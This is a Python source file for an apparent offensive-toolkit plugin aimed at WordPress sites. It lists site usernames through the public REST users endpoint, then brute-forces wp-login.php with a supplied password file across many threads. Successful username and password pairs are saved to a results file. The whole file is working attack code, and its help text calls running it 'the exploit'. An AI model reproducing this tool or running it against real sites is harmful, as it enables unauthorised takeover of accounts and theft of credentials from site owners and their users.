# wp_enum.py

import requests
import threading
import os
from assets.shell import Shell
from assets.colors import *

class wpbf:
    def __init__(self):
        self.options = {
            "TARGET": {"value": None, "required": True, "Description": "The target address or target list"},
            "THREAD": {"value": 10, "required": True, "Description": "Thread count e.g (10) default (10)"},
            "PASSWORD_FILE": {"value": None, "required": True, "Description": "Password file e.g (passwords.txt)"},
            "OUTPUT": {"value": "result/wp-result.txt", "required": False, "Description": "Output file or directory for results"}
        }

    def set_options(self, option, value):
        if option in self.options:
            self.options[option]["value"] = value
        else:
            print(f"{colors.white}[{colors.darkred}✗{colors.white}] Unknown option: {option}")

    def show_option(self):
        print(f" Plugins option ({self.__class__.__name__})")
        print()
        print(f" {'Name':<20} {'Current Setting':<25} {'Required':<10} {'Description'}")
        print(f" {'-'*20} {'-'*25} {'-'*10} {'-'*40}")
        for option, details in self.options.items():
            current_setting = details["value"] if details["value"] is not None else ""
            print(f" {option:<20} {current_setting:<25} {str(details['required']):<10} {details['Description']}")

    def set_output(self, path):
        if os.path.isdir(path):
            self.output_dir = path
            self.output_file = "wp-result.txt"
        else:
            self.output_dir, self.output_file = os.path.split(path)
            if not self.output_file:
                self.output_file = "wp-result.txt"
        
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
        self.output_path = os.path.join(self.output_dir, self.output_file)

    def get_contents(self, file_path):
        with open(file_path, 'r') as file:
            return file.read().splitlines()

    def enumerate_users(self, target):
        api_endpoint = f"{target}/wp-json/wp/v2/users"
        try:
            response = requests.get(api_endpoint, verify=False)
            if response.status_code == 200:
                users = response.json()
                usernames = [user['slug'] for user in users]
                print(f"Enumerated Users from {target}: {usernames}")
                return usernames
            else:
                print(f"Failed to enumerate users from {target}. Status code: {response.status_code}")
                return []
        except requests.exceptions.RequestException as e:
            print(f"An error occurred while enumerating users from {target}: {e}")
            return []

    def wp_login_default(self, target, username, password):
        session = requests.Session()
        login_url = f"{target}/wp-login.php"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'
        }
        payload = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In'
        }
        try:
            login_response = session.post(login_url, data=payload, headers=headers, verify=True)
            login_response.raise_for_status()
            if 'login_error' not in login_response.text and 'wp-admin' in login_response.url:
                print(f"[{colors.green}✔{colors.white}] Login successful for {username} => {password}")
                self.save_result(target, username, password)
                return True
            else:
                print(f"[{colors.red}✗{colors.white}] Login failed for {username} => {password}")
                return False
        except requests.exceptions.RequestException as e:
            print(f"Login request failed. Error: {e}")
            return False

    def save_result(self, target, username, password):
        output_path = self.options["OUTPUT"]["value"]
        with open(output_path, 'a') as file:
            file.write(f"Target: {target}, Username: {username}, Password: {password}\n")

    def run(self):
        target = self.options["TARGET"]["value"]
        thread_count = int(self.options["THREAD"]["value"])
        password_file = self.options["PASSWORD_FILE"]["value"]
        
        if not target or not password_file:
            print(f"{colors.white}[{colors.darkred}✗{colors.white}] Please set the TARGET and PASSWORD_FILE options.")
            return
        
        targets = self.get_contents(target) if os.path.isfile(target) else [target]
        passwords = self.get_contents(password_file)

        def attempt_login(username, password):
            self.wp_login_default(target, username, password)

        for target in targets:
            usernames = self.enumerate_users(target)
            threads = []
            for username in usernames:
                for password in passwords:
                    thread = threading.Thread(target=attempt_login, args=(username, password))
                    thread.start()
                    threads.append(thread)
                    if len(threads) >= thread_count:
                        for thread in threads:
                            thread.join()
                        threads = []

            for thread in threads:
                thread.join()

    def help(self):
        print("This is the WordPress User Enumerator plugin.")
        print("Options:")
        self.show_option()
        print("\nCommands:")
        print("  set [option] [value]    - Set an option")
        print("  show                    - Show current options")
        print("  exploit / run           - Run the exploit")
        print("  help                    - Show this help message")
        print("  use [plugin]            - Select a plugin to use")
        print("  exit                    - Exit the shell")
